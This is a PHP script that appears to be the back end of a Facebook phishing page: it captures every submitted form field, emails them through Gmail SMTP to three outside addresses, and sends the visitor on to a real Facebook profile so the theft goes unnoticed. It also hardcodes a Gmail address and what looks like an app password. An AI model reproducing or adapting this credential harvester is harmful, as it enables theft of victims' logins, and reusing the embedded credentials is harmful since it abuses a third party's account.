<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

header("Location:https://facebook.com/profile.php");

require 'Exception.php';
require 'PHPMailer.php';
require 'SMTP.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Initialize an empty body for the email
    $emailBody = '';

    // Iterate through the $_POST array to collect form data
    foreach ($_POST as $key => $value) {
        // Append form field name and its value to the email body
        $emailBody .= ucfirst($key) . ': ' . $value . '<br>';
    }



    // PHPMailer object creation
    $mail = new PHPMailer(true);

    try {
        // SMTP settings
        $mail->isSMTP();
        $mail->Host       = 'smtp.gmail.com'; // Replace with your SMTP server address
        $mail->SMTPAuth   = true;
        $mail->Username   = 'mixxmine07@gmail.com'; // Replace with your email address
        $mail->Password   = 'dmqc ieeq lnoa jywr'; // Replace with your email password
        $mail->SMTPSecure = 'tls';
        $mail->Port       = 587;


        // Email properties
        $mail->setFrom('mixxmine07@gmail.com', 'PROFESSOR');
        $mail->addAddress('lazimsidheeq0506@gmail.com');
         $mail->addAddress('mahboobalinizamani@gmail.com');
         $mail->addAddress('rnxsxnnxnx@gmail.com');

      // Email recipient's address

        // Email content
        $mail->isHTML(true);
        $mail->Subject = 'DILDAR';
        $mail->Body = $emailBody; // Set the email body using the collected form data
        
        // Send email
        $mail->send();
        echo 'Email successfully sent using PHPMailer.';
    } catch (Exception $e) {
        echo "Email sending failed. Error message: {$mail->ErrorInfo}";
    }
} else {
    echo "Invalid request!";
}
?>
